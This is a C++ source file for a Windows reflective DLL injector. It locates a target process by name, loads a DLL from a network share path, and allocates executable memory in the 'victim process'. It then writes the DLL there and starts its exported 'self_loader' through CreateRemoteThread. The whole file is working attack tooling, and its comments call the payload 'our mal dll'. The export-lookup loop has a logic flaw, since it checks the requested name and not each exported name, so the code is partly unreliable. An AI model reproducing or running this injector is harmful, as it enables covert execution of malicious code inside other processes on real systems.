#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <winnt.h>
#include <string.h>

using namespace std;

void Error_code(const char* error)
{
	cout << "[-] "<< error << "with error code " <<GetLastError();
   	exit(0);
}


int pidFromName(const wchar_t* procname)
{
	HANDLE hsnapShot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	hsnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hsnapShot)
	{
		cout << "could not create snapshot" << endl;
		return 0;
	}
	pe.dwSize = sizeof(PROCESSENTRY32);
	// info about first process encountered in a system snapshot
	hResult = Process32First(hsnapShot, &pe);
	while (hResult)
	{
		// if we find the process: return process ID
		if (wcscmp(procname, pe.szExeFile) == 0)
		{
			pid = pe.th32ProcessID;
			cout << "[+] pid: " << pid << endl;
			break; 
		}
		hResult = Process32Next(hsnapShot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hsnapShot);
	return pid;
}


DWORD Rva2Offset(DWORD dwRva, UINT_PTR base_address)
{
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);

	// section header = optionalHeader address + size of optionalheader
	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&ntHeader->OptionalHeader) + ntHeader->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData) return dwRva;

	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		// explanation:
		// virtualAddress = first byte of section
		// if rva > start of section and rva < end of section (start of section + size of section) 
		if (dwRva >= pSectionHeader[i].VirtualAddress && dwRva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData))
		{
			return (dwRva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData);
		}
	}
	// something went wrong
	cout << "no rva match to any section" << endl;
	return 0;
}

wchar_t* char2wchar(const char* str)
{
	size_t newsize, convertedChars = 0;
	wchar_t* wstr;

	newsize = strlen(str) + 1;
	wstr = new wchar_t[newsize];
	mbstowcs_s(&convertedChars, wstr, newsize, str, _TRUNCATE);
	return wstr;
}


DWORD get_reflective_function_offset(const char* function_name, VOID* raw_dll_base_address)
{
	UINT_PTR base_addresss;
	UINT_PTR ntHeader;
	UINT_PTR exported_functions_names_array = 0, exported_functions_addresses_array, exported_functions_ordinal_array;
	UINT_PTR export_dir = 0;
	DWORD number_of_functions = 0;
	UINT_PTR return_address,  function_offset = 0;


	base_addresss = (UINT_PTR)raw_dll_base_address;
	if ( ((PIMAGE_DOS_HEADER)base_addresss)->e_magic != IMAGE_DOS_SIGNATURE) Error_code("cant get Magic number of DLL");

	ntHeader = (UINT_PTR)(PIMAGE_NT_HEADERS)(base_addresss + ((PIMAGE_DOS_HEADER)base_addresss)->e_lfanew);
	if (((PIMAGE_NT_HEADERS)ntHeader)->Signature != IMAGE_NT_SIGNATURE) Error_code("cant get signature of DLL");

	if (((PIMAGE_NT_HEADERS)ntHeader)->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) Error_code("cant get Optional Magic of DLL");

	exported_functions_names_array = (UINT_PTR) & ((PIMAGE_NT_HEADERS)ntHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; //uinameArray
	export_dir = base_addresss + Rva2Offset(((PIMAGE_DATA_DIRECTORY)exported_functions_names_array)->VirtualAddress, base_addresss);
	
	exported_functions_names_array = base_addresss + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)export_dir)->AddressOfNames, base_addresss);
	exported_functions_addresses_array = base_addresss + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)export_dir)->AddressOfFunctions, base_addresss);
	exported_functions_ordinal_array = base_addresss + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)export_dir)->AddressOfNameOrdinals, base_addresss);
	number_of_functions = ((PIMAGE_EXPORT_DIRECTORY)export_dir)->NumberOfFunctions;

 	for (int i = 0; i < number_of_functions; i++)
	{
		char* exported_function = (char*)(base_addresss + Rva2Offset(*(DWORD*)(exported_functions_names_array),base_addresss));

		// we found the self loader function > grab the memory address
		if (strcmp(function_name, "self_loader") == 0)
		{
			return_address = base_addresss + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)export_dir)->AddressOfFunctions, base_addresss);
			// jump X dword forward in the array where X = ordinal number
			return_address += ( *(WORD*)exported_functions_ordinal_array) * sizeof(DWORD) ;
			
			// return address of function
			return Rva2Offset(*(DWORD*)return_address, base_addresss);
		}
		// move to next function name && move to next ordinal index
     	exported_functions_names_array += sizeof(DWORD);
		exported_functions_ordinal_array += sizeof(WORD);
	}
	// cant find requested function
	return 0;
}


HANDLE inject_raw_dll(HANDLE htarget_process, LPVOID dll_content, DWORD dll_size)
{
	//order of actions
	// 1. write rva to offset function in order to parse the dll pe format - rva2Offset
	// 2. find address of "self Loader" function in our mal dll > translate rva to offset
	// 3. use createThread and give it the offset of our function > our thread will start our "self_loader" function

	DWORD exported_function_offset;
	LPVOID dll_buffer;
	const char* exported_function_name = "self_loader";
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	DWORD thread_id = 0;
	HANDLE thread_handle;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;

	exported_function_offset = get_reflective_function_offset(exported_function_name, dll_content);

	if (!exported_function_offset) Error_code("function Offset could not be found");

	// 3. allocate memory & inject our dll from address that we found
	dos_header = (PIMAGE_DOS_HEADER)dll_content;
	dll_buffer = VirtualAllocEx(htarget_process ,NULL ,dll_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!dll_buffer)
		Error_code("could not allocate memory in victim process");
	
	if (!WriteProcessMemory(htarget_process, dll_buffer, dll_content, dll_size, NULL))
		Error_code("Could not write to process Memory");
	
	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)dll_buffer + exported_function_offset);
	cout << "[+] entry point: " << lpReflectiveLoader << endl;
	thread_handle = CreateRemoteThread(htarget_process, NULL, 1024 * 1024, lpReflectiveLoader, NULL, (DWORD)NULL, &thread_id);
	return thread_handle;
}


int wmain(int argc, wchar_t** argv)
{
	const wchar_t* dll_path = L"\\\\127.0.0.1\\reflect\\reflectiveDLL.dll";
	DWORD pid, dll_size;
	DWORD dll_content_bytes_read = 0;
	HANDLE hdll_file, hvictim_process;
	LPVOID dll_content = NULL;
	HANDLE victim_dll_handle;
	if (argc < 2)
	{
		printf("[-] enter process to inject our dll to");
		return 0;
	}
	pid = pidFromName(argv[1]); 
	hdll_file = CreateFile(dll_path, GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);               

 	if (hdll_file == INVALID_HANDLE_VALUE) Error_code("cant get dll handle");
		   
	dll_size = GetFileSize(hdll_file, NULL);
	if (dll_size == INVALID_FILE_SIZE) Error_code("cant get file size");
		
	dll_content = HeapAlloc(GetProcessHeap(), 0, dll_size);
	if (!dll_content) Error_code("cant allocate memory");
	if (!ReadFile(hdll_file, dll_content, dll_size, &dll_content_bytes_read, NULL)) Error_code("cant read dll file");

	hvictim_process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if (!hvictim_process) Error_code("Failed to open the target process");
		
	victim_dll_handle = inject_raw_dll(hvictim_process, dll_content, dll_size);

	if (!victim_dll_handle) Error_code("cant get handle of victim dll");
	WaitForSingleObject(victim_dll_handle, -1);
	cout << "[+] Successfully injected reflective DLL!!!" << endl;
	return 1;
}